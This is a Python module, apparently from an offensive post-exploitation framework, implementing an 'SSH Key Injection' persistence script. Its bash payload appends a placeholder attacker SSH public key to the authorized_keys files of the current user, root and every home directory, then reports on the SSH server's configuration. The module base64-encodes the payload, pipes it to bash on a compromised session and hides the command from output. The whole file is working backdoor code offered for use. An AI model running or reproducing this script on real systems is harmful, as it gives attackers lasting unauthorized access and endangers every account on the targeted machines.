"""SSH key injection script."""

from ..base import OperatorScript, ScriptResult


class SSHKeyInject(OperatorScript):
    """Inject SSH public key for persistent access."""
    
    name = "SSH Key Injection"
    description = "Inject SSH public key for persistent access"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] SSH KEY INJECTION"
echo "===================="
echo ""

SSH_KEY="${SSH_PUBKEY:-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@key}"

echo "[+] Injecting SSH key for current user..."
mkdir -p ~/.ssh 2>/dev/null
chmod 700 ~/.ssh

if echo "$SSH_KEY" >> ~/.ssh/authorized_keys 2>/dev/null; then
    echo "[+] Key injected to ~/.ssh/authorized_keys"
    chmod 600 ~/.ssh/authorized_keys
else
    echo "[-] Failed to inject key for current user"
fi

echo ""
echo "[+] Injecting key for root..."
if [ -w /root/.ssh/authorized_keys ] || [ $(id -u) -eq 0 ]; then
    mkdir -p /root/.ssh 2>/dev/null
    chmod 700 /root/.ssh
    echo "$SSH_KEY" >> /root/.ssh/authorized_keys 2>/dev/null && \
        echo "[+] Key injected to /root/.ssh/authorized_keys" || \
        echo "[-] Failed to inject root key"
    chmod 600 /root/.ssh/authorized_keys 2>/dev/null
else
    echo "[-] No write access to /root/.ssh/authorized_keys"
fi

echo ""
echo "[+] Injecting keys for other users..."
for user_home in /home/*; do
    username=$(basename "$user_home")
    ssh_dir="$user_home/.ssh"
    auth_keys="$ssh_dir/authorized_keys"
    
    if [ -d "$user_home" ]; then
        mkdir -p "$ssh_dir" 2>/dev/null
        echo "$SSH_KEY" >> "$auth_keys" 2>/dev/null && \
            echo "[+] Key injected for user: $username" || \
            echo "[-] Could not inject for: $username"
        
        chmod 700 "$ssh_dir" 2>/dev/null
        chmod 600 "$auth_keys" 2>/dev/null
        chown -R $username:$username "$ssh_dir" 2>/dev/null
    fi
done

echo ""
echo "[+] Verifying SSH server status:"
systemctl status sshd 2>/dev/null || systemctl status ssh 2>/dev/null || service ssh status 2>/dev/null

echo ""
echo "[+] SSH server configuration:"
grep -E "PasswordAuthentication|PubkeyAuthentication|PermitRootLogin" /etc/ssh/sshd_config 2>/dev/null

echo ""
echo "[+] Current authorized keys:"
find /home /root -name "authorized_keys" 2>/dev/null | while read file; do
    echo "[!] $file ($(wc -l < $file) keys)"
done

echo ""
echo "[+] To connect: ssh -i /path/to/private_key user@target_ip"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Injecting SSH keys...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="SSH key injection executed",
                metadata={"script": "ssh_key_inject"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
